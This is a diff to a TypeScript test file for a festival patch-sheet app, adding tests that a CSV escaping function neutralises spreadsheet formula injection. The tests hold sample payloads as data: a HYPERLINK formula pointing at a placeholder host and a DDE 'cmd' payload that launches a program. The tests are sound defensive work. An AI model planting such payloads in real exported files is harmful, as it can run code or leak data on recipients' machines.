@@ -17,12 +17,16 @@ import { addAct, snapshotTimetable, updateAct } from '../../../shell/timetable/m
 const buildSheet = () => {
   const doc = new Y.Doc()
   const events = new Y.Doc()
-  initSheet(doc, events, {
+  initSheet(doc, {
     title: 'Summer Fest',
     date: '2026-07-23',
     now: '2026-07-23T10:00:00.000Z',
     channelCount: 2,
   })
+  // A sheet no longer seeds an act — the running order is the whole event's
+  // (see `initSheet`) — so a test that needs a column puts one there itself,
+  // which is what the lineup does.
+  addAct(events, { name: 'Act 1', stage: 'Summer Fest', date: '2026-07-23' })
   return { doc, events, act: snapshotTimetable(events).acts[0]!.id }
 }
 
@@ -98,8 +102,47 @@ describe('csvFilename', () => {
 
   it('falls back for empty fields', () => {
     const doc = new Y.Doc()
-    initSheet(doc, new Y.Doc(), { title: ' ', date: '2026-01-01', channelCount: 1 })
+    initSheet(doc, { title: ' ', date: '2026-01-01', channelCount: 1 })
     const snap = snapshotSheet(doc)
     expect(csvFilename(snap)).toBe('Untitled_Sheet_stage_2026-01-01.csv')
+  })
+})
+
+describe('a sheet that is going to be opened in Excel', () => {
+  /**
+   * A patch sheet is paperwork that gets exported and mailed on, and the
+   * person who opens it opens it in a spreadsheet — where a cell beginning
+   * `=`, `+`, `-` or `@` is not text but a formula, and `=HYPERLINK(...)` or
+   * a `=cmd|...` DDE payload runs on their machine. Every string in the
+   * export was typed into a document anyone at the event can edit.
+   */
+  it('stops a formula being a formula', () => {
+    expect(escapeCsvField('=HYPERLINK("http://x/"&A1,"click")')).toBe(
+      '"\'=HYPERLINK(""http://x/""&A1,""click"")"'
+    )
+    expect(escapeCsvField('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
+    expect(escapeCsvField('+1-2')).toBe("'+1-2")
+    expect(escapeCsvField("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0")
+  })
+
+  it('catches the leading whitespace the check is walked past with', () => {
+    // Excel strips a leading tab or carriage return before deciding whether
+    // a cell is a formula, so a check that does not is not a check.
+    expect(escapeCsvField('\t=1+1')).toBe("'\t=1+1")
+    // A carriage return is also quoted, being one of RFC-4180's own.
+    expect(escapeCsvField('\r=1+1')).toBe('"\'\r=1+1"')
+  })
+
+  it('leaves a plain number alone, including a negative one', () => {
+    // A weight of -2.5 or a trim below stage is a number in a column somebody
+    // is going to sum. Quoting it as text stops the sum.
+    expect(escapeCsvField('-2.5')).toBe('-2.5')
+    expect(escapeCsvField('+7')).toBe('+7')
+    expect(escapeCsvField('12')).toBe('12')
+  })
+
+  it('leaves ordinary paperwork alone', () => {
+    expect(escapeCsvField('SM58')).toBe('SM58')
+    expect(escapeCsvField('DI 1 — keys')).toBe('DI 1 — keys')
   })
 })
